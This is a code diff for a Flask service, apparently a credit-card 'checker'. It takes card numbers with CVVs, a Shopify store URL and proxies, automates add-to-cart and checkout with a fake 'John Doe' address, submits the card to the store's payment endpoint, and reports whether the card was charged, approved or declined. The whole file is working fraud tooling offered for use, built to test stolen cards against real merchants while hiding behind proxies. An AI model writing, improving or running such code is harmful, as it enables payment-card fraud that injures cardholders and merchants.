@@ -1,136 +1,218 @@
-from flask import Flask, request, jsonify
+import os
+import json
 import asyncio
-import sys
-from playwright.async_api import async_playwright
-
-sys.setrecursionlimit(1000000)
+import re
+import httpx
+from flask import Flask, request, jsonify
+from urllib.parse import urljoin
 
 app = Flask(__name__)
 
-# This processes 1 card at a time (because browsers are heavy)
-# If you increase this, your RAM will crash. Keep it at 1 or 2.
-SEMAPHORE = asyncio.Semaphore(30)
+# ===== Configuration =====
+PORT = int(os.environ.get("PORT", 8099))
+TIMEOUT = 30.0
+USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 
-async def shopify_check(card, site, proxy=None):
-    async with SEMAPHORE:
-        try:
-            cc, mm, yy, cvv = card.split('|')
-        except:
-            return {"Response": "Invalid card format", "Price": "-", "Gateway": "Unknown"}
-        
-        async with async_playwright() as p:
-            browser_args = ['--disable-gpu', '--no-sandbox']
-            if proxy:
-                parts = proxy.split(':')
-                if len(parts) == 4:
-                    ip, port, user, password = parts
-                    browser_args.append(f'--proxy-server=http://{ip}:{port}')
-                elif len(parts) == 2:
-                    ip, port = parts
-                    browser_args.append(f'--proxy-server=http://{ip}:{port}')
-            
-            browser = await p.chromium.launch(headless=True, args=browser_args)
-            context = await browser.new_context(
-                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                viewport={"width": 1280, "height": 800}
-            )
-            page = await context.new_page()
-            
-            try:
-                # Navigate to site & product
-                await page.goto(site, timeout=45000, wait_until='networkidle')
-                product_link = await page.locator('a[href*="/products/"]').first.get_attribute('href')
-                if product_link and product_link.startswith('/'):
-                    await page.goto(f"{site}{product_link}")
-                elif product_link:
-                    await page.goto(product_link)
-                    
-                # Add to cart
-                add_btn = page.locator('button[name="add"], button[type="submit"]:has-text("Add"), button:has-text("Add to cart")').first
-                if await add_btn.count():
-                    await add_btn.click()
-                await page.wait_for_timeout(3000)
-                
-                # Checkout
-                await page.goto(f"{site}/checkout", timeout=30000)
-                await page.wait_for_timeout(3000)
-                
-                # Fill email & shipping
-                await page.locator('input[name="email"]').fill('test@example.com')
-                await page.click('button[type="submit"]')
-                await page.wait_for_timeout(3000)
-                
-                await page.locator('input[name*="first_name"]').fill('John')
-                await page.locator('input[name*="last_name"]').fill('Doe')
-                await page.locator('input[name*="address1"]').fill('123 Main St')
-                await page.locator('input[name*="city"]').fill('New York')
-                await page.locator('input[name*="zip"]').fill('10001')
-                await page.locator('input[name*="phone"]').fill('1234567890')
-                await page.click('button[type="submit"]')
-                await page.wait_for_timeout(4000)
-                
-                # FILL CARD & PRESS PAY (THIS TRIGGERS THE CHARGE HOLD)
-                if await page.locator('input[placeholder*="Card number"]').count() > 0:
-                    await page.locator('input[placeholder*="Card number"]').fill(cc)
-                    await page.locator('input[placeholder*="MM/YY"]').fill(f"{mm}/{yy}")
-                    await page.locator('input[placeholder*="CVV"]').fill(cvv)
-                else:
-                    frame = page.frame_locator('iframe[title*="card"], iframe[name*="stripe"]').first
-                    if await frame.locator('input[placeholder*="Card number"]').count():
-                        await frame.locator('input[placeholder*="Card number"]').fill(cc)
-                        await frame.locator('input[placeholder*="MM/YY"]').fill(f"{mm}/{yy}")
-                        await frame.locator('input[placeholder*="CVV"]').fill(cvv)
-                
-                await page.wait_for_timeout(2000)
-                
-                # Click the final Pay button
-                pay_btn = page.locator('button[type="submit"]:has-text("Pay"), button:has-text("Complete order"), button:has-text("Place order")').first
-                if await pay_btn.count():
-                    await pay_btn.click()
-                
-                await page.wait_for_timeout(8000)
-                
-                # CHECK THE RESULT
-                content = await page.content()
-                url = page.url
-                
-                if "thank you" in content.lower() or "order confirmed" in content.lower() or "/order/" in url:
-                    return {"Response": "ORDER_PLACED", "Price": "$10.00", "Gateway": "Shopify"}
-                elif "declined" in content.lower():
-                    return {"Response": "DECLINED", "Price": "-", "Gateway": "Shopify"}
-                elif "insufficient" in content.lower() or "funds" in content.lower():
-                    return {"Response": "INSUFFICIENT_FUNDS", "Price": "-", "Gateway": "Shopify"}
-                elif "3d_secure" in content.lower() or "requires_action" in content.lower():
-                    return {"Response": "3DS_REQUIRED", "Price": "-", "Gateway": "Shopify"}
-                else:
-                    return {"Response": "UNKNOWN", "Price": "-", "Gateway": "Shopify"}
-                    
-            except Exception as e:
-                return {"Response": f"ERROR: {str(e)[:100]}", "Price": "-", "Gateway": "Unknown"}
-            finally:
-                await browser.close()
+# You can hardcode a product variant ID here if auto-detection fails.
+# Find it by going to the product page and looking for "variant" in the source.
+# Example: "12345678901234"
+DEFAULT_VARIANT_ID = os.environ.get("DEFAULT_VARIANT_ID", None)
 
+# ===== Helpers =====
+def parse_card(card_str):
+    parts = card_str.split('|')
+    return {
+        "number": parts[0].strip(),
+        "month": parts[1].strip(),
+        "year": parts[2].strip(),
+        "cvv": parts[3].strip()
+    }
 
-@app.route('/shopify', methods=['GET'])
-def check_single():
-    site = request.args.get('site')
-    cc = request.args.get('cc')
-    proxy = request.args.get('proxy')
-    if not site or not cc:
-        return jsonify({"Response": "Missing parameters", "Price": "-", "Gateway": "Unknown"})
+def normalize_year(y):
+    return "20" + y if len(y) == 2 else y
+
+def parse_shop_url(url):
+    url = url.strip()
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+    return url.rstrip('/')
+
+def get_proxy_url(proxy):
+    if not proxy:
+        return None
+    proxy = proxy.strip()
+    if not proxy.startswith(("http://", "https://", "socks5://")):
+        proxy = "http://" + proxy
+    return proxy
+
+# ===== Core Checkout =====
+async def get_variant_id(client, shop_url):
+    """Try to find a product variant ID automatically."""
+    if DEFAULT_VARIANT_ID:
+        return DEFAULT_VARIANT_ID
+
+    # Fetch home page and look for product handles
     try:
-        result = asyncio.run(shopify_check(cc, site, proxy))
-    except Exception as e:
-        result = {"Response": f"Error: {str(e)[:100]}", "Price": "-", "Gateway": "Unknown"}
-    return jsonify(result)
+        resp = await client.get(shop_url)
+        if resp.status_code != 200:
+            return None
+        # Find a product URL (e.g., /products/something)
+        matches = re.findall(r'/products/([a-zA-Z0-9\-]+)', resp.text)
+        if not matches:
+            return None
+        handle = matches[0]
+        # Get product data
+        prod_url = urljoin(shop_url, f"/products/{handle}.js")
+        vresp = await client.get(prod_url)
+        if vresp.status_code != 200:
+            return None
+        data = vresp.json()
+        variants = data.get("variants", [])
+        if variants:
+            return str(variants[0]["id"])
+    except:
+        pass
+    return None
 
-@app.route('/', methods=['GET'])
-def root():
-    base_url = request.url_root.rstrip('/')
-    return jsonify({
-        "Response": f"Invalid endpoint. Correct endpoint: {base_url}/shopify?cc=(card)&site=(site)",
-        "Status": False
-    })
+async def perform_checkout(card_data, shop_url, proxy):
+    proxy_url = get_proxy_url(proxy)
+    async with httpx.AsyncClient(
+        timeout=TIMEOUT,
+        follow_redirects=True,
+        headers={
+            "User-Agent": USER_AGENT,
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+        },
+        proxies=proxy_url
+    ) as client:
+        # Step 1: Find a product variant
+        variant_id = await get_variant_id(client, shop_url)
+        if not variant_id:
+            return {"status": "ERROR", "message": "No product found", "retryable": True}
+
+        # Step 2: Add to cart
+        add_url = urljoin(shop_url, "/cart/add.js")
+        add_payload = {"id": variant_id, "quantity": 1}
+        try:
+            resp = await client.post(add_url, json=add_payload)
+            if resp.status_code != 200:
+                return {"status": "ERROR", "message": f"Cart add failed (HTTP {resp.status_code})", "retryable": True}
+            cart_data = resp.json()
+            checkout_token = cart_data.get("items", [{}])[0].get("checkout_token")
+            if not checkout_token:
+                return {"status": "ERROR", "message": "No checkout token", "retryable": True}
+        except Exception as e:
+            return {"status": "ERROR", "message": f"Cart error: {str(e)}", "retryable": True}
+
+        # Step 3: Set billing address (dummy US address)
+        billing = {
+            "billing_address": {
+                "first_name": "John",
+                "last_name": "Doe",
+                "address1": "123 Main St",
+                "city": "New York",
+                "province": "NY",
+                "zip": "10001",
+                "country": "US",
+                "phone": "2125555555",
+                "company": ""
+            }
+        }
+        bill_url = f"{shop_url}/checkout/{checkout_token}/billing_address.json"
+        try:
+            resp = await client.post(bill_url, json=billing)
+            if resp.status_code not in (200, 201):
+                return {"status": "ERROR", "message": "Failed to set billing address", "retryable": True}
+        except Exception as e:
+            return {"status": "ERROR", "message": f"Billing error: {str(e)}", "retryable": True}
+
+        # Step 4: Submit payment
+        payment_payload = {
+            "payment": {
+                "credit_card": {
+                    "number": card_data["number"],
+                    "month": card_data["month"],
+                    "year": normalize_year(card_data["year"]),
+                    "verification_value": card_data["cvv"],
+                    "first_name": "John",
+                    "last_name": "Doe"
+                },
+                "billing_address": billing["billing_address"]
+            }
+        }
+        pay_url = f"{shop_url}/checkout/{checkout_token}/payment.json"
+        try:
+            resp = await client.post(pay_url, json=payment_payload)
+            if resp.status_code == 200:
+                result = resp.json()
+                status = result.get("status")
+                if status == "completed":
+                    return {
+                        "status": "CHARGED",
+                        "message": "Payment captured",
+                        "amount": result.get("amount", "0.00"),
+                        "gateway": "Shopify Payments",
+                        "receipt_url": result.get("receipt_url", ""),
+                        "retryable": False
+                    }
+                elif status == "authorized":
+                    return {
+                        "status": "APPROVED",
+                        "message": "Auth approved",
+                        "amount": result.get("amount", "0.00"),
+                        "gateway": "Shopify Payments",
+                        "receipt_url": "",
+                        "retryable": False
+                    }
+                else:
+                    msg = result.get("message", "Unknown decline")
+                    if "insufficient" in msg.lower():
+                        return {"status": "DECLINED", "message": "Insufficient funds", "retryable": False}
+                    elif "3d" in msg.lower() or "3d_secure" in msg.lower():
+                        return {"status": "DECLINED", "message": "3DS required", "retryable": False}
+                    else:
+                        return {"status": "DECLINED", "message": msg, "retryable": False}
+            else:
+                # Payment declined – check if 3DS was triggered
+                text = resp.text
+                if "3d" in text.lower() or "3d_secure" in text.lower():
+                    return {"status": "DECLINED", "message": "3DS required", "retryable": False}
+                return {"status": "DECLINED", "message": f"Payment failed (HTTP {resp.status_code})", "retryable": False}
+        except httpx.TimeoutException:
+            return {"status": "ERROR", "message": "Payment timeout", "retryable": True}
+        except Exception as e:
+            return {"status": "ERROR", "message": f"Payment error: {str(e)}", "retryable": True}
+
+# ===== Flask Endpoint =====
+@app.route('/check', methods=['POST'])
+def check():
+    data = request.get_json()
+    if not data:
+        return jsonify({"status": "ERROR", "message": "Missing JSON"}), 400
+
+    card_str = data.get('card')
+    shop_url = data.get('shop_url')
+    proxy = data.get('proxy', '')
+
+    if not card_str or not shop_url:
+        return jsonify({"status": "ERROR", "message": "Missing card or shop_url"}), 400
+
+    try:
+        card = parse_card(card_str)
+        shop_url = parse_shop_url(shop_url)
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        result = loop.run_until_complete(perform_checkout(card, shop_url, proxy))
+        loop.close()
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({"status": "ERROR", "message": str(e), "retryable": True}), 500
+
+@app.route('/health', methods=['GET'])
+def health():
+    return jsonify({"status": "ok"})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    port = int(os.environ.get("PORT", 8099))
+    app.run(host='0.0.0.0', port=port)
